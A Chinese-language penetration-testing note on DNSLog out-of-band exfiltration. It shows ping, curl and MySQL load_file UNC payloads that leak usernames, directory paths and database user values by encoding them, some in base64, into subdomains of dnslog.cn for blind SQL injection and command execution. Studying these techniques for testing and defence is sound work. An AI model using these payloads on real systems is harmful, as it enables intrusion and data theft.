# DNSLog

参考：

https://www.cnblogs.com/Xy--1/p/12896599.html

DNSLog就是存储在DNS服务器上的域名信息。只要向DNS服务发起请求就会将域名和对应的IP记录成一条DNSLog。

例如：我么在DNSLog.cn上获取一个三级域名，当我们访问这个三级域名就会在生成一条DNSLog。访问子域名同样会产生一条DNSLog

```
C:\Users\82341>ping ejsgno.dnslog.cn

正在 Ping 82341.ejsgno.dnslog.cn [127.0.0.1] 具有 32 字节的数据:
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64

C:\Users\82341>ping %USERNAME%.ejsgno.dnslog.cn

正在 Ping 82341.ejsgno.dnslog.cn [127.0.0.1] 具有 32 字节的数据:
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
```

有如下几个平台提供免费的DNSLog服务

- [http://www.dnslog.cn](http://www.dnslog.cn/)
- [http://admin.dnslog.link](http://admin.dnslog.link/)
- [http://ceye.io](http://ceye.io/)

> 在渗透测试中，经常会遇到如下场景：
>
> 1. sql注入不能回显
> 2. blind类型的ssrf以及xxe漏洞
> 3. ==无回显的命令执行漏洞==
>
> 这时候就可以使用DNSLog

## 命令回显

```
root in ~ λ curl whoami.41v1us.dnslog.cn
```

## SQL 盲注 回显

`load_file()`函数可以获取本地文件，==但是在windows上可以通过UNC路径访问网络上的文件。==

```
mysql> select load_file(concat('\\\\',(select user from mysql.user limit 1),'.y3esmy.dnslog.cn\\a'));
```

这里`\\\\`是被转义的`\\`，且必须根上具体访问的文件。

这样我们就可以在dnslog.cn上看到。

## 编码

有些特殊的字符可能无法拼接到域名然后访问，我们可以先对想要获取的数据base64后然后发送请求

```
root in ~ λ a=$(pwd|base64).41v1us.dnslog.cn
root in ~ λ echo $a
L3Jvb3QK.41v1us.dnslog.cn
```

如果base64生成后有`=`需要使用`cut`

```
root in ~ λ a=$(whoami|base64|cut -d = -f 1).41v1us.dnslog.cn
root in ~ λ echo $a
cm9vdAo.41v1us.dnslog.cn
```

## 无回显漏洞执行或盲打

如果命令执行失败不会访问DNSLog，所以可以通过这种方法进行盲打。

```
curl $(openssl rand -hex 10).3qnd0y.dnslog.cn
```





